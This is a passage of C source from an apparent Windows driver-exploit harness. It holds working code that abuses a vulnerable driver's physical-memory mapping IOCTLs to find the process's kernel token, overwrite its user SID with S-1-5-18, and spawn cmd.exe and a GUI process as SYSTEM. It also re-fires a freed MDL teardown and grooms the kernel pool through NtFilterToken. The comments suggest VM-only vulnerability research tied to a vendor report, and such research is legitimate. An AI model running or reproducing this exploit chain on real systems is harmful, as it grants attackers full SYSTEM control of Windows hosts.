        ProofLog(L"[x] --tokmap: no token page mapped (census empty or "
                 L"classification empty)");
        rc = 2;
    } else {
        ProofLog(L"[+] --tokmap: %u token pages mapped, dumped, E2E-checked "
                 L"and torn down -- write path untouched", tokMaps);
    }
out:
    if (hSelf)
        CloseHandle(hSelf);
    {
        CONTIGREQ f = anchor;

        if (anchor.physPa && !DevCmdContigFree(&f))
            LogW(L"[x] --tokmap: anchor free failed (benign detail)");
    }
    ProofLog(L"---- --tokmap done rc=%d ----", rc);
    return rc;
}

/* ---- P5 --tkpatch : the gated E1..E7 chain (VM with snapshot ONLY) ---- */
static int HarnessTkPatch(void)
{
    CONTIGREQ anchor;
    HANDLE    hSelf = NULL, hTok = NULL;
    TPAGE     list[TK_MAXPAGES];
    UINT8     pats[3][8], pofs[3];
    UINT32    nPages = 0, nTried = 0, nForeign = 0, i;
    BOOL      pinned = FALSE, gotSys = FALSE;
    UINT64    pinPage = 0, pinBlock = 0, pinUserVa = 0;
    static BYTE orig[0x1000];
    int       rc = 0;

    ProofLog(L"==== ADIOLOTTO --tkpatch (P5 E1..E7, %ls, LIVE TOKEN "
             L"MUTATION) ====", TOOL_VERSION);
    LogW(L"[!] GATED MODE: this mutates a kernel token body (UserAndGroups "
         L"SID -> S-1-5-18). Disposable VM with snapshot ONLY. "
         L"[prior-art: physmap-class] technique; novelty claim = the "
         L"driver bug inventory");
    ZeroMemory(&anchor, sizeof(anchor));
    if (!MapPreflight(&anchor, FALSE)) {
        ProofLog(L"[x] --tkpatch: class %u -- map family refused", g_prof.cls);
        rc = 3;
        goto out;
    }
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_DUPLICATE | TOKEN_QUERY |
                          TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_GROUPS |
                          TOKEN_ADJUST_PRIVILEGES, &hSelf)) {
        ProofLog(L"[x] --tkpatch: OpenProcessToken failed GLE=%lu",
                 GetLastError());
        rc = 3;
        goto out;
    }
    if (!TokWhoAmI(hSelf)) {
        rc = 3;
        goto out;
    }
    memcpy(pats[0], &g_ownLuid, 8);
    pofs[0] = 0;
    memcpy(pats[1], g_ownSid + 0x10, 8);
    pofs[1] = 16;
    memcpy(pats[2], g_ownSid + 0x14, 8);
    pofs[2] = 20;
    ZeroMemory(list, sizeof(list));
    /* E1/E2a (v5.1.5): the bulk-map fast sweep is RETIRED from the live
     * path. Runs 6-9 established WHY it can never be used over arbitrary
     * census RAM: the 0xFFF028A4 user-map leg (MmBuildMdlForNonPagedPool
     * + MmMapLockedPagesSpecifyCache(user) + MmUnmapLockedPages) corrupts
     * the PFN entries of FREE-list pages it maps -- a "non-paged pool"
     * MDL over free RAM is a lie, and the async PFN validator pays for
     * it with 0x4E/0x7 PFN_LIST_CORRUPT (four boots, corrupt PFNs
     * 0x1000 x3 and 0x4005 mid-window; token/active pages always clean).
     * The identification sweep is therefore permanently the proven
     * CMD_SCAN walk (kernel-internal maps never user-map free pages). */
    /* v5.1.7 E1/E2: the direct route FIRST (handle enum + CR3 page-table
     * walk -- no sweep, no maps, cannot corrupt PFNs); the CMD_SCAN walk
     * below stays as the FALLBACK on failure. The bulk-map fast sweep is
     * permanently retired: runs 6-9 proved the 0xFFF028A4 user-map leg
     * corrupts the PFN entries of FREE-list pages
     * (MmBuildMdlForNonPagedPool + user map over free RAM = 0x4E/0x7,
     * four boots). */
    {
        UINT32 msLoc = 0;

        ProofLog(L"[i] --tkpatch: E2-direct lookup route (v5.1.7) -- "
                 L"sweep only on fallback");
        if (TokDirectLocate(hSelf, list, TK_MAXPAGES, &nPages, &msLoc)) {
            ProofLog(L"[+] E2-direct: identification took %lu ms (was "
                     L"362-1714 s on the sweep route)", (unsigned)msLoc);
        } else {
            ProofLog(L"[i] E2-direct unavailable -- falling back to the "
                     L"CMD_SCAN sweep per v5.0.2");
            if (!TokSweepAll(pats, pofs, L"[tkpatch]", list, TK_MAXPAGES,
                             &nPages, 1)) {
                rc = 3;
                goto out;
            }
        }
    }
    /* trial order: LUID-pinned token pages first, then SID-only pages.
     * Every non-verifying candidate is reverted page-exact inside
     * TkTrial, so a misidentification costs nothing but its write cycle
     * (and only ever lands in token bodies already carrying OUR SID). */
    for (i = 0; i < nPages && !pinned && nTried < 24; i++) {
        if (!(list[i].kinds & 2))
            continue;
        if (!TokClassifyPage(list[i].pagePa, &list[i]))
            continue;
        if (!list[i].nToke)
            continue;
        nTried++;
        LogW(L"[i] E3 trial %u: LUID-kind page 0x%012llx", nTried,
             (unsigned long long)list[i].pagePa);
        if (TkTrial(list[i].pagePa, &orig[0], hSelf, &pinPage, &pinBlock,
                    &pinUserVa))
            pinned = TRUE;
        else
            nForeign++;
    }
    if (!pinned) {
        /* E2b: SID fallback sweep (LUID pin did not verify). The cap is
         * tolerated -- with the list full we still try what we have. */
        UINT8 patsB[2][8];
        UINT8 pofsB[2];

        memcpy(patsB[0], g_ownSid + 0x10, 8);
        pofsB[0] = 16;
        memcpy(patsB[1], g_ownSid + 0x14, 8);
        pofsB[1] = 20;
        if (!TokSweepAll(patsB, pofsB, L"[tkpatch:SID]", list, TK_MAXPAGES,
                         &nPages, 2)) {
            rc = 3;
            goto out;
        }
    }
    for (i = 0; i < nPages && !pinned && nTried < 24; i++) {
        if ((list[i].kinds & 2))
            continue;
        if (!TokClassifyPage(list[i].pagePa, &list[i]))
            continue;
        if (!list[i].nToke || !list[i].nSid)
            continue;
        nTried++;
        LogW(L"[i] E3 trial %u: SID-kind page 0x%012llx (coarser route)",
             nTried, (unsigned long long)list[i].pagePa);
        if (TkTrial(list[i].pagePa, &orig[0], hSelf, &pinPage, &pinBlock,
                    &pinUserVa))
            pinned = TRUE;
        else
            nForeign++;
    }
    if (!pinned) {
        ProofLog(L"[x] --tkpatch: %u candidates tried, none verified "
                 L"through the handle (M6 rule) -- no token mutated "
                 L"permanently", nTried);
        rc = 3;
        goto out;
    }
    {
        /* E5b: duplicate the (now-patched) token as a primary for the
         * spawn; the duplicate carries a CONTENT copy of S-1-5-18 */
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        wchar_t cmd[] = L"cmd.exe /c whoami";
        char    outb[0x800];
        DWORD   got = 0, total = 0;
        BOOL    okP;

        if (!DuplicateTokenEx(hSelf,
                              TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
                              TOKEN_QUERY | TOKEN_ADJUST_DEFAULT,
                              NULL, SecurityAnonymous,
                              TokenPrimary, &hTok)) {
            ProofLog(L"[x] E5b: DuplicateTokenEx failed GLE=%lu -- token "
                     L"remains patched, reverting now", GetLastError());
            TkRevert(pinUserVa, pinBlock, &orig[0], hSelf);
            rc = 3;
            goto out;
        }
        LogW(L"[+] E5b: primary duplicate 0x%014llx carries the patched "
             L"S-1-5-18 content", (unsigned long long)(uintptr_t)hTok);
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        {
            HANDLE rp = NULL, wp = NULL;

            if (CreatePipe(&rp, &wp, &sa, 0)) {
                si.hStdOutput = si.hStdError = wp;
                SetHandleInformation(rp, HANDLE_FLAG_INHERIT, 0);
            }
            ZeroMemory(&pi, sizeof(pi));
            okP = CreateProcessWithTokenW(hTok, 0, NULL, cmd,
                                          CREATE_NO_WINDOW, NULL, NULL,
                                          &si, &pi);
            if (!okP) {
                TOKEN_PRIVILEGES tp;
                LUID  luid;

                LogW(L"[x] E5b: CreateProcessWithTokenW GLE=%lu -- trying "
                     L"CreateProcessAsUserW with "
                     L"SeAssignPrimaryTokenPrivilege", GetLastError());
                ZeroMemory(&tp, sizeof(tp));
                if (LookupPrivilegeValueW(NULL,
                                          SE_ASSIGNPRIMARYTOKEN_NAME,
                                          &luid)) {
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = luid;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    AdjustTokenPrivileges(hSelf, FALSE, &tp, 0, NULL, NULL);
                }
                ZeroMemory(&pi, sizeof(pi));
                okP = CreateProcessAsUserW(hTok, NULL, cmd, NULL, NULL,
                                           TRUE, CREATE_NO_WINDOW, NULL,
                                           NULL, &si, &pi);
            }
            /* v5.0.1: close the PARENT's write end BEFORE the read -- the
             * 04:19 field run blocked forever in ReadFile because our own
             * wp kept the pipe open past the child's exit (classic
             * anonymous-pipe EOF bug, harness-side only). */
            CloseHandle(wp);
            wp = NULL;
            if (okP) {
                WaitForSingleObject(pi.hProcess, 15000);
                while (total < sizeof(outb) - 1 &&
                       ReadFile(rp, outb + total,
                                (DWORD)(sizeof(outb) - 1 - total), &got,
                                NULL) && got)
                    total += got;
                if (!total && rp) {
                    Sleep(300);
                    ReadFile(rp, outb + total, 1, &got, NULL);
                }
                outb[total] = 0;
                LogW(L"[E7] child (pid %lu) whoami says: %hs",
                     pi.dwProcessId, outb);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                /* v5.0.2: case-insensitive -- whoami prints
                 * "nt authority\system" lowercase, and the 05:39 run log
                 * said system-child=no despite a printed [E7]
                 * nt authority\system line. */
                {
                    char *q = outb;

                    for (; *q; q++)
                        if (*q >= 'A' && *q <= 'Z')
                            *q = (char)(*q + ('a' - 'A'));
                }
                if (strstr(outb, "system")) {
                    gotSys = TRUE;
                    ProofLog(L"[+] *** E7: child whoami reads SYSTEM -- "
                             L"[prior-art: physmap-class] escalation "
                             L"exhibit COMPLETE ***");
                }
                CloseHandle(rp);
                CloseHandle(wp);
                /* v5.1.6 E7b: visible GUI exhibit -- spawn a windowed
                 * process under the duplicated SYSTEM primary token so
                 * the demonstration has a human-visible artifact
                 * alongside the machine-readable whoami proof. Win11
                 * calc.exe is a UWP app that often refuses
                 * CreateProcessAsUserW with a raw SYSTEM token, so
                 * notepad.exe is the fallback. The exhibit is NOT
                 * waited on and NOT killed: it stays alive so the VM
                 * desktop can be screenshotted. (Caveat, logged below:
                 * when the harness is driven over ssh it lives in
                 * session 0, so the window may not surface on the
                 * console desktop -- the SYSTEM-privileged process and
                 * its pid are still the evidence.) */
                {
                    STARTUPINFOW        sx;
                    PROCESS_INFORMATION px;
                    wchar_t             gui1[] = L"calc.exe";
                    wchar_t             gui2[] = L"notepad.exe";
                    wchar_t            *which  = NULL;
                    BOOL                okG    = FALSE;

                    ZeroMemory(&sx, sizeof(sx));
                    sx.cb = sizeof(sx);
                    ZeroMemory(&px, sizeof(px));
                    okG = CreateProcessAsUserW(hTok, NULL, gui1,
                                               NULL, NULL, FALSE, 0,
                                               NULL, NULL, &sx, &px);
                    if (okG) {
                        which = gui1;
                    } else {
                        LogW(L"[E7b] calc.exe refused (GLE=%lu) -- "
                             L"falling back to notepad.exe",
                             GetLastError());
                        ZeroMemory(&sx, sizeof(sx));
                        sx.cb = sizeof(sx);
                        ZeroMemory(&px, sizeof(px));
                        okG = CreateProcessAsUserW(hTok, NULL, gui2,
                                                   NULL, NULL, FALSE, 0,
                                                   NULL, NULL, &sx, &px);
                        if (okG)
                            which = gui2;
                    }
                    if (okG && which) {
                        LogW(L"[+] E7b: GUI exhibit %ls spawned as SYSTEM "
                             L"(pid %lu) [prior-art: physmap-class]",
                             which, px.dwProcessId);
                        ProofLog(L"[+] E7b: GUI exhibit %ls spawned as "
                                 L"SYSTEM (pid %lu) -- elevated process "
                                 L"created from the patched kernel token",
                                 which, px.dwProcessId);
                        /* No wait, no kill: the exhibit stays up. */
                        CloseHandle(px.hProcess);
                        CloseHandle(px.hThread);
                    } else {
                        LogW(L"[x] E7b: GUI exhibit refused (last GLE=%lu)"
                             L" -- whoami child remains the proof",
                             GetLastError());
                        ProofLog(L"[x] E7b: GUI exhibit refused (last "
                                 L"GLE=%lu) -- whoami child remains the "
                                 L"proof", GetLastError());
                    }
                }
            } else {
                ProofLog(L"[x] E7: both spawn paths failed (GLE=%lu)",
                         GetLastError());
                CloseHandle(rp);
                CloseHandle(wp);
            }
        }
    }
    TkRevert(pinUserVa, pinBlock, &orig[0], hSelf);
    ProofLog(L"[+] E6: revert issued (see its own verification line)");
out:
    if (hTok)
        CloseHandle(hTok);
    if (hSelf)
        CloseHandle(hSelf);
    {
        CONTIGREQ f = anchor;

        if (anchor.physPa && !DevCmdContigFree(&f))
            LogW(L"[x] --tkpatch: anchor free failed (benign detail)");
    }
    ProofLog(L"---- --tkpatch done rc=%d (tried=%u foreign=%u "
             L"system-child=%ls) ----", rc, nTried, nForeign,
             gotSys ? L"yes" : L"no");
    if (rc == 0)
        LogW(L"[P5] --tkpatch complete: map -> patch -> verify -> spawn -> "
             L"revert [prior-art: physmap-class]");
    return rc;
}

/* ---- P5 --gadget0 : 0xFFF0289C + 0xFFF028A0 pair audit ---------------- */
static int HarnessGadget0(void)
{
    PAGEALLOCREQ a;
    BYTE         wbuf[0x20], rbuf[0x20] = { 0 };
    SIZE_T       bw = 0, br = 0, br2 = 0;
    WORD         st = 0xFFFF;

    ProofLog(L"==== --gadget0 (P5 pair audit, %ls) ====", TOOL_VERSION);
    LogW(L"[novel: argument-forwarding + no-consumed-state] stage (b) "
         L"RE-FIRES a torn-down pair -- VM with snapshot ONLY, a bugcheck "
         L"is a legitimate exhibit, not a failure");
    LogW(L"[i] stage (a): 0xFFF0289C alloc 1 page (MmAllocatePagesForMdl, "
         L"attacker bounds)");
    if (!DevCmdPageAlloc(0, 0xFFFFFFFFFFFFFFFFULL, 1, &a)) {
        ProofLog(L"[x] --gadget0: pages-alloc transport failure");
        return 1;
    }
    if (a.status != 0 || !a.userVa || !a.mdl) {
        ProofLog(L"[x] --gadget0: pages-alloc status %u userVa=0x%016llx "
                 L"mdl=0x%016llx -- alloc refused", a.status,
                 (unsigned long long)a.userVa, (unsigned long long)a.mdl);
        return 2;
    }
    LogW(L"[+] pages-alloc: bytes=0x%llx userVa=0x%012llx mdl=0x%016llx "
         L"pages=%u", (unsigned long long)a.mapBytes,
         (unsigned long long)a.userVa, (unsigned long long)a.mdl,
         a.pages);
    LogW(L"[i] stage (a) control: WPM marker + RPM readback");
    if (!ReadProcessMemory(GetCurrentProcess(),
                           (LPCVOID)(ULONG_PTR)a.userVa, wbuf, 0x20, &br) ||
        br != 0x20) {
        ProofLog(L"[x] --gadget0: control RPM over the fresh pages failed "
                 L"GLE=%lu -- view unusable", GetLastError());
        return 2;
    }
    if (!WriteProcessMemory(GetCurrentProcess(),
                            (LPVOID)(ULONG_PTR)a.userVa, &marker_g0, 8,
                            &bw) || bw != 8) {
        ProofLog(L"[x] --gadget0: WPM marker failed GLE=%lu", GetLastError());
        return 2;
    }
    if (!ReadProcessMemory(GetCurrentProcess(),
                           (LPCVOID)(ULONG_PTR)a.userVa, rbuf, 0x20, &br2) ||
        br2 != 0x20 || memcmp(rbuf, &marker_g0, 8)) {
        ProofLog(L"[x] --gadget0: marker readback mismatch -- view "
                 L"unusable (WPM=%ls read=%llub)",
                 bw == 8 ? L"ok" : L"fail", br2);
        return 2;
    }
    LogW(L"[+] stage (a) control: view live and writable (marker 0x%016llx)",
         (unsigned long long)*(const UINT64 *)rbuf);
    LogW(L"[i] stage (a) teardown: 0xFFF028A0 with the REAL leaked pair "
         L"(userVa + mdl) -- the intended path");
    if (!DevCmdPageTear(a.userVa, a.mdl, &st)) {
        ProofLog(L"[x] --gadget0: teardown transport failure -- keep the "
                 L"pair, do NOT refire");
        return 1;
    }
    LogW(L"[+] teardown status %u (worker writes 0 whenever mdl != 0 -- "
         L"no validation, no consumed state)", st);
    if (ReadProcessMemory(GetCurrentProcess(),
                          (LPCVOID)(ULONG_PTR)a.userVa, rbuf, 0x20, &br2)) {
        LogW(L"[!] --gadget0: user view STILL READABLE after the A0 "
             L"teardown -- unmap leg did nothing observable");
    } else {
        LogW(L"[+] user view now faults (RPM GLE=%lu) -- the kernel ran "
             L"MmUnmapLockedPages with OUR leaked pointers [novel: "
             L"argument-forwarding proof]", GetLastError());
    }
    LogW(L"[!] stage (b): RE-FIRE of the SAME torn-down pair -- documents "
         L"the no-consumed-state lifecycle. A bugcheck here is the "
         L"expected exhibit.");
    if (!DevCmdPageTear(a.userVa, a.mdl, &st)) {
        ProofLog(L"[?] stage (b): transport refused (driver or host died) "
                 L"-- if this is a bugcheck recovery, that IS the exhibit");
        return 2;
    }
    LogW(L"[+] stage (b): refire accepted, status %u -- the worker re-ran "
         L"a teardown on a dead pair (no consumed flag)", st);
    ProofLog(L"[+] --gadget0 complete: pair audit staged (see log for the "
             L"stage-(b) outcome)");
    return 0;
}

/* --mapdiag : preflight only (no chain actions), verdict + census map --
 * the PSIRT-report evidence run for the boot-profile classes. */
static int HarnessMapDiag(void)
{
    CONTIGREQ anchor;
    int rc = 0;

    ProofLog(L"==== --mapdiag (%ls) ====", TOOL_VERSION);
    ZeroMemory(&anchor, sizeof(anchor));
    if (!MapPreflight(&anchor, FALSE)) {
        ProofLog(L"[x] --mapdiag: class %u -- this boot refuses the map "
                 L"family entirely; restore S2 and reboot to retest",
                 g_prof.cls);
        rc = 3;
    } else {
        ProofLog(L"[+] --mapdiag: class %u accepted (route %ls)",
                 g_prof.cls, g_prof.useWalk ? L"walk (CR3)"
                                            : L"census scan");
        rc = 0;
    }
    {
        CONTIGREQ f = anchor;

        if (anchor.physPa && !DevCmdContigFree(&f))
            LogW(L"[x] --mapdiag: anchor free failed (benign detail)");
    }
    return rc;
}

static int HarnessS2Token(UINT32 cycles)
{
    static const UINT32 kL0      = 0xFF0;   /* top single-page capture len */
    static const UINT32 kLStep   = 0x40;    /* len ladder step             */
    static const UINT32 kLLadder = 12;      /* 0xFF0 down to 0x7B0         */
    static const UINT32 kMaxN    = 48;      /* restrict-SID ladder depth   */
    /* seed spans: g_seedSpan starts with the run-8 cluster addresses and
     * re-seeds itself on every scan hit (strong or false), so after the
     * first hit of this boot all later scans run +-2 MB around it. Only a
     * boot with totally different pool placement still needs the full
     * 0..6 GB fallback sweep (see S2Seed / S2SeedScan). */
    static const BYTE kSysSid[12] = { 0x01, 0x01, 0, 0, 0, 0, 0, 0x05,
                                      0x12, 0, 0, 0 };  /* S-1-5-18    */
    NTSTATUS (NTAPI *pFilterToken)(HANDLE, ULONG, PTOKEN_GROUPS,
                                   PTOKEN_GROUPS, PTOKEN_PRIVILEGES,
                                   PHANDLE) = NULL;
    ULONG   (NTAPI *pqsi)(ULONG, void *, ULONG, ULONG *) = NULL;
    UINT32  probeN = 0, probeS = 0;
    DWORD   probeTag = 0x656B6F54UL;  /* 'Toke' default; v4.1.9 discovery
                                        * overwrites with the real token
                                        * pool tag this boot */
    CONTIGREQ anchor;
    UINT64    donorUserVa = 0, donorMdl = 0;
    UINT64    cr3 = 0;           /* E1.5 walk: KVA->PA, kills the 6 GB scans */
    DEVREQ    cap;
    UINT64    anchorPa = 0, anchorCap = 0;
    UINT8     ownSid[68], zsub[0x100], grpMem[8 + 64 * 16],
              sidMem[64 * 12];
    UINT32    ownSidLen = 0, leaked = 0, fired = 0, recli = 0, patched = 0;
    UINT32    c, i, Li, n;
    BOOL      gotSys = FALSE;
    BOOL      probeOK = FALSE;  /* v4.1.5: token-size measured */
    BOOL      stopRun = FALSE;   /* v4.1.4: stop after the first idle M5 */
    HANDLE    hSelf = NULL;      /* REAL self token handle */
    HMODULE   hNtdll;
    int       rc = 3;

    Section(L"[P3e] --s2token: leak -> donor paint -> A8 fire -> stale "
            L"window -> token reclaim -> S-1-5-18 patch -> SYSTEM child");
    ProofLog(L"==== --s2token (P3e, %ls, walk-or-scan route) ====",
             TOOL_VERSION);
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll)
        pFilterToken = (NTSTATUS (NTAPI *)(HANDLE, ULONG, PTOKEN_GROUPS,
                                          PTOKEN_GROUPS, PTOKEN_PRIVILEGES,
                                          PHANDLE))
                       GetProcAddress(hNtdll, "NtFilterToken");
    if (hNtdll)
        pqsi = (ULONG (NTAPI *)(ULONG, void *, ULONG, ULONG *))
               GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!pFilterToken) {
        ProofLog(L"[x] NtFilterToken not resolvable -- lure unavailable");
        return 3;
    }
    {
        /* our OWN user SID: what we look for in the token body (and what
         * M6's pre-patch sanity should see through the landed handle) */
        BYTE  ti[0x400];
        DWORD rl = 0;
        SID  *s;

        if (!GetTokenInformation((HANDLE)(LONG_PTR)-4/* self token */,
                                 TokenUser, ti, sizeof(ti), &rl)) {
            ProofLog(L"[x] GetTokenInformation(TokenUser) failed GLE=%lu",
                     GetLastError());
            return 3;
        }
        s = ((TOKEN_USER *)ti)->User.Sid;
        ownSidLen = 8 + (UINT32)s->SubAuthorityCount * 4;
        memcpy(ownSid, s, ownSidLen);
        LogW(L"[i] own user SID: len=%u rev=%u count=%u", ownSidLen,
             ownSid[0], ownSid[1]);
    }
    /* M5 lure needs a REAL handle: run-9 field-proof that the current-
     * process pseudo token (HANDLE)-4 gets NTSTATUS 0xc0000008
     * (STATUS_INVALID_HANDLE) from NtFilterToken and zeroed the whole
     * ladder -- it works for query APIs but is not a real object entry */
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE |
                          TOKEN_QUERY | TOKEN_ADJUST_DEFAULT |
                          TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_PRIVILEGES,
                          &hSelf)) {
        ProofLog(L"[x] OpenProcessToken failed GLE=%lu -- NtFilterToken "
                 L"needs a real handle (run-9: pseudo-handle -4 got "
                 L"0xc0000008)", GetLastError());
        return 3;
    }
    LogW(L"[i] [M5] self token real handle opened (DUPLICATE|QUERY|"
         L"ADJUST_DEFAULT|ADJUST_GROUPS)");
    {   /* v4.2.0: M5-probe v3 -- ULONG-granular full-table diff with
         * close-return verification. v4.1.9 field decode nailed it:
         * 'Toke' moved at 8/49 n's with an IDENTICAL body delta of
         * +0x700 at read-offset +12 (= the SIZE_T used field's low
         * ULONG at +16, 1792-byte token body); the >=16-hit winner
         * threshold was the miss because background 'Toke' churn
         * masks the open-delta in most iterations. 'SeTl'/'SeAt'
         * "+2^32-class" deltas were high-ULONG carries of ULONGLONG
         * reads, not real movers. v4.2.0: compare ULONG fields only,
         * require open-delta >= 0x100 AND close returns it EXACTLY
         * (the churn-proof signature), hits >= 8, winner = largest
         * max delta in [0x40,0xff0]. Capture fires at the measured
         * body size so the freed chunk's bucket byte-identically
         * matches the token. Layout field-confirmed x4: base 8,
         * stride 40, tag at +0; entry halves = NONPAGED (allocs@4,
         * frees@8, used@16) then PAGED (@24,28,32) on 24H2. */
        static BYTE  sA[0x20000], sB[0x20000];
        static ULONG hitsW[0x2000], maxD[0x2000], offMax[0x2000];
        static UINT32 nMax[0x2000];
#define KP_FIELDS 9
        static const ULONG offs[KP_FIELDS] =
            { 4, 8, 12, 16, 20, 24, 28, 32, 36 };
        ULONG qcnt = 0, stride = 40, winner = 0xFFFFFFFF;
        ULONG i, j, logged;

        if (QsiFetch(pqsi) && g_qsiLen >= 8) {
            qcnt = *(ULONG *)g_qsiBuf;
            if (qcnt <= 0x2000) {
                memcpy(sA, g_qsiBuf, g_qsiLen);
                ZeroMemory(hitsW, sizeof(hitsW));
                ZeroMemory(maxD, sizeof(maxD));
                ZeroMemory(nMax, sizeof(nMax));
                ZeroMemory(offMax, sizeof(offMax));
                for (n = 0; n <= kMaxN; n++) {
                    HANDLE   pTok = NULL;
                    NTSTATUS ns;

                    *(ULONG *)grpMem = n;
                    for (i = 0; i < n; i++) {
                        S2FSID *s = (S2FSID *)(sidMem + i * 12);
                        SID_AND_ATTRIBUTES *sa =
                            (SID_AND_ATTRIBUTES *)(grpMem + 8 + i * 16);

                        s->rev = 1;
                        s->cnt = 1;
                        memset(s->ia, 0, 6);    /* S-1-0-x */
                        s->sub = (DWORD)(i + 1);
                        sa->Sid = (PSID)(uintptr_t)s;
                        sa->Attributes = 0;
                    }
                    ns = pFilterToken(hSelf, 0, NULL,
                                      (PTOKEN_GROUPS)grpMem, NULL, &pTok);
                    if (ns || !pTok) {
                        LogW(L"[i] [M5probe] n=%u failed NTSTATUS=0x%08lx",
                             n, (unsigned long)ns);
                        continue;
                    }
                    QsiFetch(pqsi);          /* OPEN state  -> sB      */
                    memcpy(sB, g_qsiBuf, g_qsiLen);
                    CloseHandle(pTok);
                    QsiFetch(pqsi);          /* CLOSED state (new A)  */
                    logged = 0;
                    for (i = 0; i < qcnt; i++) {
                        BYTE *eA = sA + 8 + i * stride;
                        BYTE *eB = sB + 8 + i * stride;
                        BYTE *eC = g_qsiBuf + 8 + i * stride;

                        if (g_qsiLen < 8 + (i + 1) * stride)
                            break;
                        for (j = 0; j < KP_FIELDS; j++) {
                            ULONG vA = *(ULONG *)(eA + offs[j]);
                            ULONG vB = *(ULONG *)(eB + offs[j]);
                            ULONG vC = *(ULONG *)(eC + offs[j]);
                            ULONG dOpen = vB - vA;      /* mod 2^32 */
                            LONG  dCls  = (LONG)(vC - vB);

                            if (vB > vA && dOpen > 0x100 &&
                                dCls == -(LONG)dOpen) {
                                /* open grew by dOpen and close returned
                                 * it EXACTLY -- the token body field */
                                hitsW[i]++;
                                if (dOpen >= maxD[i]) {
                                    maxD[i] = dOpen;
                                    nMax[i] = n;
                                    offMax[i] = offs[j];
                                }
                                if (logged < 4) {
                                    LogW(L"[i] [M5probe] n=%u: tag "
                                         L"'%C%C%C%C' field@+%lu "
                                         L"open+%lu close-returned",
                                         n, eB[0], eB[1], eB[2], eB[3],
                                         offs[j], (unsigned long)dOpen);
                                    logged++;
                                }
                            }
                        }
                    }
                    memcpy(sA, g_qsiBuf, g_qsiLen);
                }
                for (i = 0; i < qcnt; i++) {
                    if (hitsW[i] >= 8 && maxD[i] >= 0x40 &&
                        maxD[i] <= 0xFF0 &&
                        (winner == 0xFFFFFFFF ||
                         hitsW[i] > hitsW[winner] ||
                         (hitsW[i] == hitsW[winner] &&
                          maxD[i] > maxD[winner])))
                        winner = i;
                }
                if (winner != 0xFFFFFFFF) {
                    BYTE *e = g_qsiBuf + 8 + winner * stride;

                    probeN = nMax[winner];
                    probeS = maxD[winner];
                    probeOK = TRUE;
                    probeTag = (DWORD)e[0] | ((DWORD)e[1] << 8) |
                               ((DWORD)e[2] << 16) | ((DWORD)e[3] << 24);
                    ProofLog(L"[i] M5 probe DISCOVERY: token tag '%C%C%C%C' "
                             L"(entry %lu, hits %lu/49, used-field @+%lu), "
                             L"body 0x%x bytes at n=%u -> capture len "
                             L"0x%03x, bucket 0x%x",
                             e[0], e[1], e[2], e[3], winner,
                             (unsigned long)hitsW[winner],
                             (unsigned long)offMax[winner], probeS, probeN,
                             probeS, probeS + 0x10);
                } else {
                    ProofLog(L"[i] M5 probe: no entry passed 8+ close-"
                             L"return-verified open-deltas in [0x40,0xff0] "
                             L"-- len ladder unchanged; the [M5probe] "
                             L"mover lines in the .log hold the data");
                }
            }
        } else {
            ProofLog(L"[i] M5 probe unavailable (pool-tag query failed) "
                     L"-- len ladder unchanged");
        }
    }
    /* v4.4.0 [M5probe2]: per-process token body sizes. The 01:25 run was a
     * CLEAN negative -- 49 same-bucket token allocs from our own pinned
     * thread never reclaimed the freed 0x700 chunk (window + hdr tag both
     * unmoved). This probe measures what token body each accessible
     * process produces through the SAME NtFilterToken(n=0) call the lure
     * uses, so v4.5 can pivot on data: either another lure source with a
     * body in [0x40,0xff0] exists, or token bodies are lookaside-tagged
     * and no NtFilterToken ladder can ever reclaim a generic free-list
     * chunk. Read-only and benign (handles closed immediately). */
    {
        static BYTE pbuf[0x40000];
        char   t4[4];
        ULONG  sz, nOK = 0, nDen = 0;
        UINT32 pi, measured[16], nMeas = 0;

        t4[0] = (char)(probeTag & 0xFF);
        t4[1] = (char)((probeTag >> 8) & 0xFF);
        t4[2] = (char)((probeTag >> 16) & 0xFF);
        t4[3] = (char)((probeTag >> 24) & 0xFF);
        sz = sizeof(pbuf);
        if ((LONG)pqsi(5 /* SystemProcessInformation */, pbuf, sz, &sz) != 0)
            ProofLog(L"[i] [M5probe2] process walk unavailable "
                     L"(NTSTATUS != 0) -- body-size table skipped");
        else {
            BYTE *p = pbuf;

            /* x64 class-5 header (field-crash decode 2026-10-16: v4.4.0 read
             * pid@+0x10 = CycleTime, name len@+0x18, name ptr@+0x20 =
             * CreateTime.lo -- memcpy from a garbage pointer AV'd at ~entry
             * 48, the first with nonzero CycleTime low bits. Real x64
             * layout: UniqueProcessId @0x50, ImageName @0x38/0x40.) */
            for (pi = 0; pi < 512 && p; pi++) {
                HANDLE hP = NULL, tS = NULL, tF = NULL;
                ULONG  uA, uB, uC;
                LONG64 delta;
                USHORT nl;
                void  *nb;
                ULONGLONG pid;

                if (p < pbuf || p > pbuf + sz - 0x64)
                    break;
                nl = *(USHORT *)(p + 0x38);      /* ImageName.Length */
                nb = (void *)(uintptr_t)*(ULONGLONG *)(p + 0x40);
                pid = *(ULONGLONG *)(p + 0x50);  /* UniqueProcessId */
                {
                    wchar_t  nm[48];
                    LONG     stf;
                    LONG64   dCls;

                    if (!pid)
                        goto nextProc;
                    /* name must live inside the returned buffer */
                    if (nl && (nb < (void *)pbuf ||
                               (const BYTE *)nb + nl > pbuf + sz))
                        goto nextProc;
                    memcpy(nm, nb, (nl < 44) ? (SIZE_T)nl : 44);
                    nm[(nl < 44) ? nl / 2 : 22] = 0;
                    hP = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                     FALSE, (DWORD)pid);
                    if (!hP || !OpenProcessToken(hP, TOKEN_QUERY |
                                                TOKEN_DUPLICATE, &tS)) {
                        nDen++;
                        goto nextProc;
                    }
                    QsiFetch(pqsi);
                    uA = QsiTagUsed(t4);
                    stf = (LONG)pFilterToken(tS, 0, NULL, NULL, NULL, &tF);
